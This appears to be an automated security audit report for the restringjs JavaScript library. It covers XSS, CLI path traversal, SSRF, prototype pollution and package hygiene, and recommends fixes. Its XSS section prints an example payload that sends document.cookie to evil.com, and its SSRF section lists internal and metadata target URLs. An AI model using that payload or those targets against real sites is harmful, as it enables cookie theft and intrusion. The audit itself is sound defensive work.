# restringjs Security Audit Report

**Date:** 2026-03-31  
**Package:** restringjs v0.1.0  
**Auditor:** Automated security review  
**Scope:** Full source audit — supply chain, CLI, adapters, UI, package hygiene

---

## Executive Summary

restringjs is a small, well-scoped library with a modest attack surface. The codebase avoids most dangerous patterns (no `eval`, no dynamic `require` with user input, no secret handling). However, there is **one high-severity XSS vulnerability** in the rich text editor, and several medium/low findings worth addressing before a 1.0 release.

| Severity | Count | Summary |
|----------|-------|---------|
| 🔴 High | 1 | Stored XSS via `dangerouslySetInnerHTML` in rich text mode |
| 🟠 Medium | 2 | CLI path traversal surface; localStorage data accessible to XSS |
| 🟡 Low | 3 | REST adapter SSRF surface; prototype pollution in `applyOverrides`; string escape incomplete in bake |
| ℹ️ Info | 2 | Package hygiene notes; dependency review |

---

## 1. Supply Chain / Dependency Audit

### Production Dependencies (2 total)

| Package | Version | Risk |
|---------|---------|------|
| `@formatjs/icu-messageformat-parser` | 2.11.4 | ✅ Low — well-maintained FormatJS project, pure parser |
| `ts-morph` | 25.0.1 | ✅ Low — TypeScript AST manipulation, mature project. Only used in CLI path (dynamic import), not bundled for browser |

**`pnpm audit` result:** No known vulnerabilities found.

**Assessment:** The dependency footprint is minimal and well-chosen. `ts-morph` is appropriately lazy-loaded so it doesn't bloat the browser bundle. No transitive dependency concerns identified.

### Peer Dependencies

React ≥18 and ReactDOM ≥18 — standard, no issues.

---

## 2. CLI Safety — `bake` Command

**Files:** `src/cli/bin.ts`, `src/cli/bake.ts`

### 2a. Path Traversal / Arbitrary File Write — 🟠 Medium

The `bake` command accepts source file glob patterns directly from CLI arguments:

```typescript
// bin.ts
const sources = args.slice(1).filter((a: string) => !a.startsWith('--'));
// ... passed directly to:
project.addSourceFilesAtPaths(pattern);  // ts-morph
```

Then modified files are saved with `sourceFile.save()`, which writes back to the original file path resolved by ts-morph.

**Risk:** A user (or script) can pass `../../etc/some-file` or `/absolute/path` patterns. Since `bake` is a CLI tool run with the user's own permissions, this is primarily a **foot-gun risk** rather than a privilege escalation — the user already has filesystem access. However:

- There is **no validation** that resolved file paths stay within the project directory.
- There is **no allowlist** of file extensions (could match `.json`, `.js`, or other files if the glob is broad).
- The `--overrides=` path is also unsanitized — it reads any file the user specifies.

**Recommendation:**
1. Resolve all source paths and verify they are within the current working directory (or a configured project root).
2. Restrict to known extensions (`.ts`, `.tsx`, `.js`, `.jsx`).
3. Log which files will be modified before writing (or require `--dry-run` first).

### 2b. Overrides File Parsing — ✅ Safe

```typescript
overrides = JSON.parse(fs.readFileSync(overridesPath, 'utf-8'));
```

`JSON.parse` is safe against code execution. The `importOverrides` function in `io.ts` additionally validates that all values are strings. However, `bin.ts` uses raw `JSON.parse` without the `importOverrides` validation — values could be non-strings, potentially causing unexpected behavior in `bake()`.

**Recommendation:** Use `importOverrides()` in `bin.ts` for consistent validation.

### 2c. String Escaping in Bake — 🟡 Low

```typescript
function escapeString(str: string): string {
  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n');
}
```

This escapes backslashes, single quotes, and newlines. Missing escapes:
- **Carriage return** (`\r`) — could cause subtle issues on Windows
- **Null bytes** (`\0`) — could cause truncation in some contexts
- **Unicode line/paragraph separators** (`\u2028`, `\u2029`) — valid in strings but problematic in some JS contexts

**Recommendation:** Use a more comprehensive escape function, or delegate to ts-morph's own string literal creation API if available.

---

## 3. REST Adapter — SSRF Surface

**File:** `src/adapters/index.ts`

```typescript
export function createRestAdapter(endpoint: string, options?: RequestInit): RestringAdapter {
  return {
    async load() {
      const res = await fetch(endpoint, { method: 'GET', ...options, ... });
```

### 3a. SSRF Patterns — 🟡 Low

The REST adapter makes `fetch()` calls to a user-configured `endpoint`. There is no URL validation — the endpoint could be:
- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://localhost:6379/` (internal services)
- `file:///etc/passwd` (depending on fetch implementation)

**Mitigating factors:**
- This is a **library**, not a server. The endpoint is configured by the **consuming developer**, not by end users.
- The adapter runs in the **browser** (client-side fetch) in typical usage, where SSRF to cloud metadata is not possible.
- When used server-side (via `createServerApply` or similar), the developer controls the endpoint.

**Assessment:** This is standard for a library adapter pattern. The risk only materializes if a consuming application passes **user-controlled input** as the endpoint URL, which would be an application-level bug, not a library bug.

**Recommendation (defense-in-depth):**
1. Add a JSDoc warning: "Do not pass user-controlled URLs as the endpoint."
2. Optionally validate that the endpoint starts with `http://` or `https://` (reject `file://`, `ftp://`, etc.).

### 3b. Response Validation — 🟡 Low

```typescript
return (await res.json()) as OverrideMap;
```

The response is cast to `OverrideMap` without validation. A malicious or misconfigured server could return:
- Non-string values (numbers, objects, arrays) — would propagate through the system
- `__proto__` keys — see prototype pollution note in §6

**Recommendation:** Validate the response shape (similar to `importOverrides` in `io.ts`).

---

## 4. XSS Vectors — Rich Text Editor

**File:** `src/ui/sidebar.tsx`

### 4a. Stored XSS via `dangerouslySetInnerHTML` — 🔴 High

```tsx
{config.richText ? (
  <div
    contentEditable
    suppressContentEditableWarning
    onBlur={(e) => {
      onChange(e.currentTarget.innerHTML);  // Reads raw HTML from contentEditable
      onBlur();
    }}
    dangerouslySetInnerHTML={{ __html: value }}  // Renders unsanitized HTML
  />
) : ( ... )}
```

**Attack flow:**
1. A field is configured with `richText: true`.
2. An override value containing malicious HTML is loaded from any adapter (REST, localStorage, or even memory if the consuming app passes untrusted data).
3. The value is rendered via `dangerouslySetInnerHTML` without sanitization.
4. Any `<script>`, `<img onerror=...>`, `<svg onload=...>`, or event handler in the HTML executes in the page context.

**Example payload stored as an override:**
```html
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Mitigating factors:**
- The sidebar is a **developer tool**, typically enabled only in development/staging — not in production.
- Overrides come from developer-controlled sources (localStorage, REST API they configure).

**However:**
- If the REST adapter loads from a compromised or misconfigured server, this becomes a supply-chain XSS.
- If localStorage is populated by another XSS elsewhere on the page, this creates an XSS persistence vector.
- The `onBlur` handler reads `innerHTML` from the contentEditable div — a user who pastes rich content could inadvertently inject event handlers.

**Recommendation (required):**
1. **Sanitize HTML** before rendering. Use DOMPurify or a similar library:
   ```tsx
   dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(value) }}
   ```
2. Also sanitize the `onBlur` output before storing:
   ```tsx
   onChange(DOMPurify.sanitize(e.currentTarget.innerHTML));
   ```
3. Alternatively, use a controlled rich text approach (e.g., only allow specific tags via a whitelist).

### 4b. Non-Rich-Text Fields — ✅ Safe

Plain text fields use `<textarea>` with `value={value}`, which is naturally safe against XSS — React escapes text content.

### 4c. Highlight Overlay — ✅ Safe

The highlight component (`highlight.tsx`) uses text node matching and DOM measurement only — no `innerHTML` or `dangerouslySetInnerHTML`. Safe.

---

## 5. localStorage Adapter — Data Leakage

**File:** `src/adapters/index.ts`

### 5a. Same-Origin Accessibility — 🟠 Medium

```typescript
const raw = getStorage().getItem(key);  // key = 'restringjs:overrides'
```

localStorage data is accessible to **any JavaScript running on the same origin**. Concerns:

- **XSS amplification:** If an attacker achieves XSS on the page, they can read/write all restringjs overrides. Combined with the rich text XSS (§4a), an attacker could persist a malicious payload that re-executes on every page load.
- **Third-party scripts:** Analytics, ad scripts, or other third-party JS on the same origin can read overrides.
- **Sensitive content:** If overrides contain business-sensitive text (pricing, unreleased copy, legal text), this data is exposed.

**Mitigating factors:**
- This is standard behavior for any localStorage-based tool.
- The tool is typically used in development, not production.

**Recommendation:**
1. Document that localStorage overrides are accessible to all same-origin scripts.
2. Consider an option to encrypt/obfuscate stored data (low priority).
3. Consider `sessionStorage` as an alternative option (clears on tab close).

### 5b. No Size Limits — ℹ️ Info

There's no limit on the size of data stored. A very large override set could fill localStorage (typically 5-10MB limit), potentially breaking other features on the same origin that use localStorage. Low risk, but worth noting.

---

## 6. eval / Dynamic Code Execution

### 6a. No `eval` or `Function()` — ✅ Safe

`grep` for `eval` and `Function(` returned zero results. The codebase does not use any dynamic code execution.

### 6b. Dynamic Imports — ✅ Safe

Three dynamic `import()` calls exist, all with **static string paths**:
- `import('./bake.js')` — CLI only
- `import('fs')` — CLI only  
- `import('ts-morph')` — CLI only

No user input flows into import paths. Safe.

### 6c. Prototype Pollution Surface — 🟡 Low

**File:** `src/core/apply.ts`

```typescript
export function applyOverrides<T extends Record<string, unknown>>(
  original: T,
  overrides: OverrideMap,
): T {
  const result = { ...original };
  for (const [key, value] of Object.entries(overrides)) {
    if (!key.includes('.')) {
      if (key in result) {
        (result as Record<string, unknown>)[key] = value;
      }
    }
  }
```

The `unflattenObject` function is more concerning:

```typescript
export function unflattenObject(flat: Record<FieldPath, string>): Record<string, unknown> {
  for (const [path, value] of Object.entries(flat)) {
    const keys = path.split('.');
    let current = result;
    for (let i = 0; i < keys.length - 1; i++) {
      const key = keys[i]!;
      current[key] = {};  // No __proto__ check
    }
    current[lastKey] = value;
  }
}
```

If an attacker can control override keys (e.g., via the REST adapter), they could set:
- `__proto__.isAdmin` → prototype pollution
- `constructor.prototype.isAdmin` → prototype pollution

**Mitigating factors:**
- `Object.entries()` does not enumerate `__proto__` on most engines.
- The `in` check in `applyOverrides` limits writes to existing keys.
- `unflattenObject` is more vulnerable but is only used internally.

**Recommendation:**
1. Add key validation to reject `__proto__`, `constructor`, and `prototype` as path segments:
   ```typescript
   const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
   ```
2. Apply this check in `unflattenObject`, `applyOverrides`, and `flattenObject`.

---

## 7. Package Hygiene

### 7a. `files` Field — ✅ Good

```json
"files": ["dist", "README.md", "LICENSE"]
```

Only `dist/`, `README.md`, and `LICENSE` are published. Source code, tests, configs, and `node_modules` are excluded. This is correct.

### 7b. No Secrets in Source or Dist — ✅ Clean

- No `.env` files found.
- No matches for `secret`, `password`, `token`, `api_key` in source.
- No hardcoded credentials.
- `.gitignore` excludes `node_modules`, `dist`, `*.tgz`, `coverage`.

### 7c. Dist Contents — ✅ Clean

The `dist/` directory contains only:
- Compiled JS (ESM + CJS) with chunk splitting
- TypeScript declaration files (`.d.ts`, `.d.cts`)
- CLI entry point
- No source maps that could leak source (confirmed by listing)

### 7d. Binary Entry — ✅ Correct

```json
"bin": { "restringjs": "./dist/cli/bin.js" }
```

Points to the correct compiled CLI entry. The file has the appropriate `#!/usr/bin/env node` shebang.

### 7e. `prepublishOnly` — ✅ Good

```json
"prepublishOnly": "pnpm run check && pnpm run build && pnpm run test"
```

Runs typecheck, lint, build, and tests before publish. Good practice.

---

## Findings Summary & Recommendations

### Must Fix Before 1.0

| # | Severity | Finding | File | Recommendation |
|---|----------|---------|------|----------------|
| 1 | 🔴 High | Stored XSS via `dangerouslySetInnerHTML` in rich text mode | `sidebar.tsx:296` | Sanitize with DOMPurify before rendering and before storing |

### Should Fix

| # | Severity | Finding | File | Recommendation |
|---|----------|---------|------|----------------|
| 2 | 🟠 Medium | CLI `bake` has no path boundary validation | `bake.ts`, `bin.ts` | Validate resolved paths stay within project root |
| 3 | 🟠 Medium | localStorage overrides readable by any same-origin script | `adapters/index.ts` | Document the risk; consider sessionStorage option |
| 4 | 🟡 Low | REST adapter response not validated | `adapters/index.ts` | Validate response shape matches `OverrideMap` |
| 5 | 🟡 Low | Prototype pollution surface in `unflattenObject` | `apply.ts` | Reject `__proto__`/`constructor`/`prototype` keys |
| 6 | 🟡 Low | Incomplete string escape in `bake` | `bake.ts` | Handle `\r`, `\0`, `\u2028`, `\u2029` |

### Nice to Have

| # | Severity | Finding | File | Recommendation |
|---|----------|---------|------|----------------|
| 7 | ℹ️ Info | `bin.ts` uses raw `JSON.parse` instead of `importOverrides` | `bin.ts` | Use `importOverrides()` for consistent validation |
| 8 | ℹ️ Info | REST adapter endpoint not validated | `adapters/index.ts` | Add JSDoc warning; optionally reject non-HTTP schemes |

---

## Methodology

- Static analysis of all TypeScript source files in `src/`
- `grep`-based search for dangerous patterns (`eval`, `Function(`, `innerHTML`, `dangerouslySetInnerHTML`, `__proto__`, dynamic imports)
- Dependency audit via `pnpm audit`
- Manual review of data flow through adapters → store → UI
- Package hygiene review of `files` field, `.gitignore`, `dist/` contents
- No source code was modified during this audit
